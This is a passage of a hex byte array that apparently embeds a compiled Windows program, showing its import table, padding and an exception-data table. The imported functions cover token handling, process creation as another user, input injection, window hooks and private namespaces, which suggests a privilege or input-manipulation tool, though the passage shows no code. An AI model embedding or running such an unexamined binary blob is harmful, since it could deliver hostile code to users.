	0x78, 0x65, 0x63, 0x75, 0x74, 0x65, 0x45, 0x78, 0x57, 0x00, 0x53, 0x48, 0x45, 0x4C, 0x4C, 0x33,
	0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0xFF, 0x01, 0x47, 0x65, 0x74, 0x43, 0x6F, 0x6D, 0x6D, 0x61,
	0x6E, 0x64, 0x4C, 0x69, 0x6E, 0x65, 0x57, 0x00, 0x40, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72,
	0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x40, 0x01, 0x44, 0x65,
	0x76, 0x69, 0x63, 0x65, 0x49, 0x6F, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x00, 0xA0, 0x02,
	0x47, 0x65, 0x74, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x46, 0x69, 0x6C, 0x65, 0x4E, 0x61, 0x6D,
	0x65, 0x57, 0x00, 0x00, 0x98, 0x03, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65,
	0x50, 0x72, 0x6F, 0x63, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62,
	0x75, 0x74, 0x65, 0x4C, 0x69, 0x73, 0x74, 0x00, 0x24, 0x06, 0x57, 0x61, 0x69, 0x74, 0x46, 0x6F,
	0x72, 0x53, 0x69, 0x6E, 0x67, 0x6C, 0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0xE5, 0x00,
	0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6C, 0x65, 0x57, 0x00, 0x6F, 0x02, 0x47, 0x65,
	0x74, 0x46, 0x69, 0x6C, 0x65, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x73, 0x57,
	0x00, 0x00, 0x4E, 0x01, 0x44, 0x75, 0x70, 0x6C, 0x69, 0x63, 0x61, 0x74, 0x65, 0x48, 0x61, 0x6E,
	0x64, 0x6C, 0x65, 0x00, 0x3E, 0x04, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73,
	0x73, 0x00, 0xD8, 0x00, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x57,
	0x00, 0x00, 0x8C, 0x02, 0x47, 0x65, 0x74, 0x4C, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72, 0x6F, 0x72,
	0x00, 0x00, 0x07, 0x06, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x54, 0x68,
	0x72, 0x65, 0x61, 0x64, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x9C, 0x00,
	0x43, 0x6C, 0x6F, 0x73, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x00, 0xF6, 0x03, 0x4C, 0x6F,
	0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x57, 0x00, 0x00, 0x36, 0x01, 0x44, 0x65,
	0x6C, 0x65, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x41, 0x74,
	0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x4C, 0x69, 0x73, 0x74, 0x00, 0xDC, 0x02, 0x47, 0x65,
	0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x00, 0x41, 0x02,
	0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73,
	0x73, 0x49, 0x64, 0x00, 0x01, 0x01, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63,
	0x65, 0x73, 0x73, 0x57, 0x00, 0x00, 0xD3, 0x01, 0x46, 0x72, 0x65, 0x65, 0x4C, 0x69, 0x62, 0x72,
	0x61, 0x72, 0x79, 0x00, 0x66, 0x02, 0x47, 0x65, 0x74, 0x45, 0x78, 0x69, 0x74, 0x43, 0x6F, 0x64,
	0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x00, 0xC7, 0x05, 0x53, 0x6C, 0x65, 0x65,
	0x70, 0x00, 0x41, 0x01, 0x44, 0x69, 0x73, 0x61, 0x62, 0x6C, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61,
	0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x43, 0x61, 0x6C, 0x6C, 0x73, 0x00, 0x85, 0x01,
	0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0xD7, 0x05, 0x54, 0x65,
	0x72, 0x6D, 0x69, 0x6E, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x00,
	0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x10, 0x01,
	0x45, 0x6E, 0x75, 0x6D, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x00, 0xAF, 0x03, 0x53, 0x68,
	0x6F, 0x77, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x00, 0x00, 0x5B, 0x02, 0x49, 0x73, 0x57, 0x69,
	0x6E, 0x64, 0x6F, 0x77, 0x56, 0x69, 0x73, 0x69, 0x62, 0x6C, 0x65, 0x00, 0xE8, 0x01, 0x47, 0x65,
	0x74, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x00, 0x05, 0x02, 0x47, 0x65, 0x74, 0x57, 0x69, 0x6E,
	0x64, 0x6F, 0x77, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73,
	0x49, 0x64, 0x00, 0x00, 0xA0, 0x03, 0x53, 0x65, 0x74, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73,
	0x48, 0x6F, 0x6F, 0x6B, 0x45, 0x78, 0x57, 0x00, 0xD5, 0x03, 0x55, 0x6E, 0x68, 0x6F, 0x6F, 0x6B,
	0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x48, 0x6F, 0x6F, 0x6B, 0x45, 0x78, 0x00, 0x20, 0x00,
	0x43, 0x61, 0x6C, 0x6C, 0x4E, 0x65, 0x78, 0x74, 0x48, 0x6F, 0x6F, 0x6B, 0x45, 0x78, 0x00, 0x00,
	0x26, 0x03, 0x53, 0x65, 0x6E, 0x64, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x00, 0x4F, 0x03, 0x53, 0x65,
	0x74, 0x46, 0x6F, 0x72, 0x65, 0x67, 0x72, 0x6F, 0x75, 0x6E, 0x64, 0x57, 0x69, 0x6E, 0x64, 0x6F,
	0x77, 0x00, 0x55, 0x01, 0x47, 0x65, 0x74, 0x44, 0x6C, 0x67, 0x49, 0x74, 0x65, 0x6D, 0x00, 0x00,
	0x37, 0x01, 0x47, 0x65, 0x74, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x4E, 0x61, 0x6D, 0x65, 0x57, 0x00,
	0x1A, 0x01, 0x46, 0x69, 0x6E, 0x64, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x57, 0x00, 0x61, 0x01,
	0x47, 0x65, 0x74, 0x46, 0x6F, 0x72, 0x65, 0x67, 0x72, 0x6F, 0x75, 0x6E, 0x64, 0x57, 0x69, 0x6E,
	0x64, 0x6F, 0x77, 0x00, 0x6D, 0x02, 0x4C, 0x6F, 0x61, 0x64, 0x4B, 0x65, 0x79, 0x62, 0x6F, 0x61,
	0x72, 0x64, 0x4C, 0x61, 0x79, 0x6F, 0x75, 0x74, 0x57, 0x00, 0xFD, 0x00, 0x45, 0x6E, 0x75, 0x6D,
	0x43, 0x68, 0x69, 0x6C, 0x64, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x00, 0x00, 0x19, 0x01,
	0x46, 0x69, 0x6E, 0x64, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x45, 0x78, 0x57, 0x00, 0xF9, 0x03,
	0x56, 0x6B, 0x4B, 0x65, 0x79, 0x53, 0x63, 0x61, 0x6E, 0x45, 0x78, 0x57, 0x00, 0x00, 0x55, 0x53,
	0x45, 0x52, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x5B, 0x01, 0x47, 0x65, 0x74, 0x54,
	0x6F, 0x6B, 0x65, 0x6E, 0x49, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x00,
	0x8B, 0x00, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x41,
	0x73, 0x55, 0x73, 0x65, 0x72, 0x57, 0x00, 0x00, 0x0F, 0x02, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72,
	0x6F, 0x63, 0x65, 0x73, 0x73, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x00, 0x00, 0x57, 0x01, 0x47, 0x65,
	0x74, 0x53, 0x69, 0x64, 0x53, 0x75, 0x62, 0x41, 0x75, 0x74, 0x68, 0x6F, 0x72, 0x69, 0x74, 0x79,
	0x00, 0x00, 0x41, 0x44, 0x56, 0x41, 0x50, 0x49, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00,
	0x91, 0x00, 0x43, 0x6F, 0x55, 0x6E, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65,
	0x00, 0x00, 0x2B, 0x00, 0x43, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x49, 0x6E, 0x73, 0x74,
	0x61, 0x6E, 0x63, 0x65, 0x00, 0x00, 0x61, 0x00, 0x43, 0x6F, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61,
	0x6C, 0x69, 0x7A, 0x65, 0x45, 0x78, 0x00, 0x00, 0x6F, 0x6C, 0x65, 0x33, 0x32, 0x2E, 0x64, 0x6C,
	0x6C, 0x00, 0x4F, 0x4C, 0x45, 0x41, 0x55, 0x54, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00,
	0xB9, 0x01, 0x4E, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x54,
	0x6F, 0x6B, 0x65, 0x6E, 0x00, 0x00, 0xA8, 0x04, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69, 0x74, 0x69,
	0x61, 0x6C, 0x69, 0x7A, 0x65, 0x53, 0x69, 0x64, 0x00, 0x00, 0xE7, 0x02, 0x52, 0x74, 0x6C, 0x41,
	0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x48, 0x65, 0x61, 0x70, 0x00, 0x0B, 0x06, 0x52, 0x74,
	0x6C, 0x53, 0x75, 0x62, 0x41, 0x75, 0x74, 0x68, 0x6F, 0x72, 0x69, 0x74, 0x79, 0x53, 0x69, 0x64,
	0x00, 0x00, 0x54, 0x03, 0x52, 0x74, 0x6C, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x42, 0x6F, 0x75,
	0x6E, 0x64, 0x61, 0x72, 0x79, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x6F, 0x72, 0x00,
	0xAA, 0x01, 0x4E, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x00, 0xEA, 0x01,
	0x4E, 0x74, 0x51, 0x75, 0x65, 0x72, 0x79, 0x49, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69,
	0x6F, 0x6E, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x87, 0x03, 0x52, 0x74, 0x6C, 0x44,
	0x65, 0x6C, 0x65, 0x74, 0x65, 0x42, 0x6F, 0x75, 0x6E, 0x64, 0x61, 0x72, 0x79, 0x44, 0x65, 0x73,
	0x63, 0x72, 0x69, 0x70, 0x74, 0x6F, 0x72, 0x00, 0xB8, 0x01, 0x4E, 0x74, 0x4F, 0x70, 0x65, 0x6E,
	0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x92, 0x04, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69,
	0x74, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00,
	0xED, 0x01, 0x4E, 0x74, 0x51, 0x75, 0x65, 0x72, 0x79, 0x49, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61,
	0x74, 0x69, 0x6F, 0x6E, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x00, 0x4A, 0x01, 0x4E, 0x74, 0x44, 0x65,
	0x6C, 0x61, 0x79, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0xFA, 0x04,
	0x52, 0x74, 0x6C, 0x4C, 0x65, 0x6E, 0x67, 0x74, 0x68, 0x52, 0x65, 0x71, 0x75, 0x69, 0x72, 0x65,
	0x64, 0x53, 0x69, 0x64, 0x00, 0x00, 0x03, 0x01, 0x4E, 0x74, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00,
	0x93, 0x04, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69, 0x74, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65,
	0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x45, 0x78, 0x00, 0x00, 0x16, 0x04, 0x52, 0x74, 0x6C, 0x46,
	0x72, 0x65, 0x65, 0x53, 0x69, 0x64, 0x00, 0x00, 0xD3, 0x05, 0x52, 0x74, 0x6C, 0x53, 0x65, 0x74,
	0x45, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E, 0x6D, 0x65, 0x6E, 0x74, 0x56, 0x61, 0x72, 0x69, 0x61,
	0x62, 0x6C, 0x65, 0x00, 0x2E, 0x03, 0x52, 0x74, 0x6C, 0x43, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65,
	0x43, 0x72, 0x63, 0x33, 0x32, 0x00, 0x4D, 0x02, 0x4E, 0x74, 0x53, 0x65, 0x74, 0x45, 0x76, 0x65,
	0x6E, 0x74, 0x00, 0x00, 0x12, 0x04, 0x52, 0x74, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x48, 0x65, 0x61,
	0x70, 0x00, 0x96, 0x02, 0x4E, 0x74, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4F,
	0x66, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0xB7, 0x01, 0x4E, 0x74, 0x4F, 0x70,
	0x65, 0x6E, 0x50, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x4E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61,
	0x63, 0x65, 0x00, 0x00, 0xDD, 0x02, 0x52, 0x74, 0x6C, 0x41, 0x64, 0x64, 0x53, 0x49, 0x44, 0x54,
	0x6F, 0x42, 0x6F, 0x75, 0x6E, 0x64, 0x61, 0x72, 0x79, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70,
	0x74, 0x6F, 0x72, 0x00, 0xBD, 0x01, 0x4E, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x53, 0x65, 0x63, 0x74,
	0x69, 0x6F, 0x6E, 0x00, 0x9E, 0x01, 0x4E, 0x74, 0x4D, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4F,
	0x66, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0x6D, 0x00, 0x4C, 0x64, 0x72, 0x44,
	0x69, 0x73, 0x61, 0x62, 0x6C, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x43, 0x61, 0x6C, 0x6C,
	0x6F, 0x75, 0x74, 0x73, 0x46, 0x6F, 0x72, 0x44, 0x6C, 0x6C, 0x00, 0x00, 0x42, 0x00, 0x45, 0x74,
	0x77, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65, 0x4E, 0x6F, 0x52, 0x65, 0x67,
	0x69, 0x73, 0x74, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x2E,
	0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0xE0, 0x10, 0x00, 0x00, 0x20, 0x48, 0x00, 0x00, 0xE0, 0x10, 0x00, 0x00,
	0x78, 0x11, 0x00, 0x00, 0x34, 0x48, 0x00, 0x00, 0x78, 0x11, 0x00, 0x00, 0x55, 0x12, 0x00, 0x00,
	0x44, 0x48, 0x00, 0x00, 0x58, 0x12, 0x00, 0x00, 0xE6, 0x12, 0x00, 0x00, 0x5C, 0x48, 0x00, 0x00,
	0xE8, 0x12, 0x00, 0x00, 0x72, 0x14, 0x00, 0x00, 0x64, 0x48, 0x00, 0x00, 0x74, 0x14, 0x00, 0x00,
	0x21, 0x16, 0x00, 0x00, 0x78, 0x48, 0x00, 0x00, 0x24, 0x16, 0x00, 0x00, 0xC5, 0x16, 0x00, 0x00,
	0x90, 0x48, 0x00, 0x00, 0xA4, 0x17, 0x00, 0x00, 0x95, 0x19, 0x00, 0x00, 0xA0, 0x48, 0x00, 0x00,
	0x98, 0x19, 0x00, 0x00, 0x8E, 0x1B, 0x00, 0x00, 0xC0, 0x48, 0x00, 0x00, 0x90, 0x1B, 0x00, 0x00,
	0x70, 0x1E, 0x00, 0x00, 0xE0, 0x48, 0x00, 0x00, 0x70, 0x1E, 0x00, 0x00, 0x35, 0x1F, 0x00, 0x00,
	0xFC, 0x48, 0x00, 0x00, 0x38, 0x1F, 0x00, 0x00, 0x8C, 0x20, 0x00, 0x00, 0x0C, 0x49, 0x00, 0x00,
	0x8C, 0x20, 0x00, 0x00, 0xF1, 0x20, 0x00, 0x00, 0x20, 0x49, 0x00, 0x00, 0xF4, 0x20, 0x00, 0x00,
	0x4C, 0x22, 0x00, 0x00, 0x28, 0x49, 0x00, 0x00, 0x4C, 0x22, 0x00, 0x00, 0xF4, 0x22, 0x00, 0x00,
	0x44, 0x49, 0x00, 0x00, 0xF4, 0x22, 0x00, 0x00, 0xC1, 0x23, 0x00, 0x00, 0x54, 0x49, 0x00, 0x00,
	0xC4, 0x23, 0x00, 0x00, 0x75, 0x25, 0x00, 0x00, 0x64, 0x49, 0x00, 0x00, 0xD4, 0x26, 0x00, 0x00,
	0x42, 0x27, 0x00, 0x00, 0x7C, 0x49, 0x00, 0x00, 0x58, 0x27, 0x00, 0x00, 0xF0, 0x28, 0x00, 0x00,
	0x88, 0x49, 0x00, 0x00, 0xF0, 0x28, 0x00, 0x00, 0x2B, 0x29, 0x00, 0x00, 0xA0, 0x49, 0x00, 0x00,
	0x2C, 0x29, 0x00, 0x00, 0x44, 0x29, 0x00, 0x00, 0xA8, 0x49, 0x00, 0x00, 0x44, 0x29, 0x00, 0x00,
	0x4E, 0x29, 0x00, 0x00, 0xA8, 0x49, 0x00, 0x00, 0x50, 0x29, 0x00, 0x00, 0xA2, 0x29, 0x00, 0x00,
	0xB0, 0x49, 0x00, 0x00, 0xA4, 0x29, 0x00, 0x00, 0xB6, 0x29, 0x00, 0x00, 0xA8, 0x49, 0x00, 0x00,
	0xB8, 0x29, 0x00, 0x00, 0x4B, 0x2A, 0x00, 0x00, 0x7C, 0x49, 0x00, 0x00, 0x4C, 0x2A, 0x00, 0x00,
	0xEB, 0x2A, 0x00, 0x00, 0x7C, 0x49, 0x00, 0x00, 0xF8, 0x2A, 0x00, 0x00, 0x9F, 0x2C, 0x00, 0x00,
	0xB8, 0x49, 0x00, 0x00, 0xA0, 0x2C, 0x00, 0x00, 0x55, 0x2D, 0x00, 0x00, 0xC8, 0x49, 0x00, 0x00,
	0x58, 0x2D, 0x00, 0x00, 0xA5, 0x2D, 0x00, 0x00, 0x20, 0x49, 0x00, 0x00, 0xA8, 0x2D, 0x00, 0x00,
	0xC9, 0x2D, 0x00, 0x00, 0xA8, 0x49, 0x00, 0x00, 0xCC, 0x2D, 0x00, 0x00, 0x4F, 0x2E, 0x00, 0x00,
	0xD4, 0x49, 0x00, 0x00, 0x50, 0x2E, 0x00, 0x00, 0x12, 0x32, 0x00, 0x00, 0xE4, 0x49, 0x00, 0x00,
	0x14, 0x32, 0x00, 0x00, 0xD3, 0x32, 0x00, 0x00, 0xFC, 0x49, 0x00, 0x00, 0xD4, 0x32, 0x00, 0x00,
	0x81, 0x34, 0x00, 0x00, 0x14, 0x4A, 0x00, 0x00, 0x84, 0x34, 0x00, 0x00, 0xFF, 0x34, 0x00, 0x00,
	0x28, 0x4A, 0x00, 0x00, 0x00, 0x35, 0x00, 0x00, 0x33, 0x36, 0x00, 0x00, 0x3C, 0x4A, 0x00, 0x00,
	0x34, 0x36, 0x00, 0x00, 0x5A, 0x37, 0x00, 0x00, 0x50, 0x4A, 0x00, 0x00, 0x80, 0x37, 0x00, 0x00,
